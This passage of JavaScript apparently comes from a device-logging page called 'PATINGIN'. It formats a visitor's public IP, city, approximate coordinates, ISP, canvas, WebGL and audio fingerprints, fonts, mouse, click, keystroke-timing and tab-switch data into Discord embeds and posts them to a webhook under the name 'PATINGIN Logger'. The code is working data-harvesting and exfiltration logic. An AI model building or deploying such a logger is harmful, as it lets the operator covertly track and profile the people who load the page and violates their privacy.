    { title:'🌐 Location & Locale',
      keys:['Public IP','City','Region','Country','Postal','Approx Coords','ISP / Org','ASN','Confidence',
            'Language','All Languages','Timezone','Locale','Hour Cycle','Do Not Track'] },
    { title:'🔒 Fingerprints & Behavior',
      keys:['Canvas FP','WebGL FP','Audio FP','Fonts Found','Ad Blocker',
            'Time on Page','Mouse Movements','Last Mouse Pos','Click Count',
            'Scroll Depth','Key Presses','Avg Key Interval','Tab Switches'] },
    { title:'🆔 Browser & Combined ID',
      keys:['Browser','Referrer','History Length','Tab State','Device FP Hash','User Agent'] },
  ];

  const usedKeys = new Set();
  const embeds = GROUP_DEFS.map(g => {
    const lines = g.keys.filter(k => _data[k] !== undefined).map(k => {
      usedKeys.add(k);
      return `**${k}:** ${_data[k]}`;
    });
    return lines.length ? { title: g.title, description: lines.join('\n').slice(0, 4000), color: 0x00ff88 } : null;
  }).filter(Boolean);

  // Catch any uncategorized keys
  const leftover = Object.keys(_data).filter(k => !usedKeys.has(k));
  if (leftover.length) {
    embeds.push({
      title: '📌 Other',
      description: leftover.map(k => `**${k}:** ${_data[k]}`).join('\n').slice(0, 4000),
      color: 0x00ff88
    });
  }

  // Add header + footer
  const headerEmbed = {
    title: '🔍 PATINGIN — Full Device Report v2.0',
    description: `Scan completed at **${new Date().toLocaleString()}**\nTotal data points: **${Object.keys(_data).length}**`,
    color: 0x00ff88,
  };
  const allEmbeds = [headerEmbed, ...embeds];

  // Chunk into groups of 10 (Discord limit)
  const chunks = [];
  for (let i = 0; i < allEmbeds.length; i += 10) chunks.push(allEmbeds.slice(i, i + 10));

  try {
    for (let i = 0; i < chunks.length; i++) {
      const res = await fetch(WEBHOOK, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username: 'PATINGIN Logger', embeds: chunks[i] })
      });
      if (!res.ok) throw new Error('HTTP ' + res.status);
      if (i < chunks.length - 1) await sleep(1000); // Discord rate-limit gap
    }
    status.textContent = '✅ SENT SUCCESSFULLY';
    status.className = 'ok';
    btn.textContent = '⟩ SENT ✓';
  } catch (e) {
    status.textContent = '✗ FAILED: ' + e.message;
    status.className = 'err';
    btn.disabled = false;
  }
}
